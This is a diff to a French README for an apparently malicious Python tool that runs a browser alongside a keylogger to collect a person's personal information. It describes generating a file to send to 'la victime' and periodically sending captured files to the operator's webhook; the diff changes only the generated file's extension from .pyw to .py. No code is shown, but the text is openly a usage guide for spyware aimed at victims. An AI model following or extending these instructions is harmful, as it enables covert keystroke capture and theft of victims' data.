@@ -4,7 +4,7 @@ Python 3.9
 # Explication
 Ce programme lance un navigateur et un keylogger en même temps , sert a récuperer les infos personelles d'une personne
 # Installation
-Il faut juste installer [python](https://www.python.org/downloads/) et il suffira de le lancer et le programme créera un fichier .pyw a envoyer a la victime
+Il faut juste installer [python](https://www.python.org/downloads/) et il suffira de le lancer et le programme créera un fichier .py a envoyer a la victime
 # Utilisation
 Demarrez le main.py et entrez votre webhook et votre temps en seconde d'intervalle entre chaque envois de fichiers aux webhook
 ## Petit Plus
